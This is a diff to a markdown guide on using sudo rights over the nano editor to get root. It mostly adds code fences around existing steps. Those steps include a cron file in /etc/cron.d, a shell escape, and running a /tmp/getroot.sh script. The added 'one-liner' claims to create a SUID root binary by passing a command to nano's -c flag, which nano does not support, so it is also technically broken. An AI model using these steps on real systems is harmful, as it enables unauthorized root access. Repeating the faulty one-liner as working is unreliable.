@@ -20,7 +20,8 @@ then we use the
 
 ---------------
 
-Using nano :
+# Using nano :
+
 
 ## Check Your Sudo Rights First:
 
@@ -150,6 +151,7 @@ sudo nano /etc/cron.d/rootme
 
 Some nano versions allow direct shell escape:
 
+```
 bash
 
 sudo nano
@@ -175,10 +177,16 @@ bash -i
 # 4. Make executable and run
 sudo chmod +x /tmp/getroot.sh
 sudo /tmp/getroot.sh
+```
 
 ## Quick One-liner Method:
 
+```
 bash
 
 # If you can run nano with sudo, use it to create a SUID binary
 sudo nano /tmp/suid.c -c 'sudo bash -c "gcc -o /tmp/suid /tmp/suid.c && chmod 4755 /tmp/suid"'
+```
+
+--------------
+
